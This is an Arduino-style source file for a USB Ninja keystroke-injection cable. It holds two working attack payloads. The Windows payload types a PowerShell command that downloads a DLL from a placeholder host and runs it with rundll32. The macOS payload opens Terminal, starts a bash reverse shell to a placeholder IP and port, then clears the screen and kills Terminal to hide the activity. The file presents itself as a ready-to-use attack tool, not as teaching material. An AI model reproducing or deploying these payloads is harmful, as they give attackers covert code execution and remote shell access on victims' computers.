/*

Author:
  Gilson Camelo | Twitter: @GSCAMELO 

*/

#include <NinjaKeyboard.h>

void setup(){}

void loop() {}

/* WINDOWS */

void payloadA()
{

    USBninjaOnline();
    NinjaKeyboard.begin();
    NinjaKeyboard.delay(1000);
    NinjaKeyboard.sendKeyStroke(0);
    NinjaKeyboard.delay(1000);
    NinjaKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    NinjaKeyboard.delay(100);
    NinjaKeyboard.print(F("powershell.exe"));
    NinjaKeyboard.delay(100);
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.delay(500);
    NinjaKeyboard.println(F("(New-Object System.Net.WebClient).DownloadFile(\"http://IP/https.dll\", \"C:\\Users\\Public\\Documents\\https.dll\"); rundll32 C:\\Users\\Public\\Documents\\https.dll,Start; exit"));
    NinjaKeyboard.delay(100);
    NinjaKeyboard.end();
    USBninjaOffline();
    NinjaKeyboard.begin();

}

/* MAC OS */

void payloadB(){
    USBninjaOnline();
    NinjaKeyboard.begin();
    NinjaKeyboard.delay(1000);
    NinjaKeyboard.sendKeyStroke(0);
    NinjaKeyboard.delay(1000);
    NinjaKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);   
    NinjaKeyboard.delay(200);
    NinjaKeyboard.print(F("Terminal"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER); 
    NinjaKeyboard.delay(1000); 
    NinjaKeyboard.print(F("bash -i >& /dev/tcp/IP/PORT 0>&1 &"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.delay(1000); 
    NinjaKeyboard.print(F("clear"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);
    NinjaKeyboard.delay(1000); 
    NinjaKeyboard.print(F("killall Terminal"));
    NinjaKeyboard.sendKeyStroke(KEY_ENTER);

    // Stop and remove keyboard   
    NinjaKeyboard.delay(100);
    NinjaKeyboard.end();
    USBninjaOffline();
}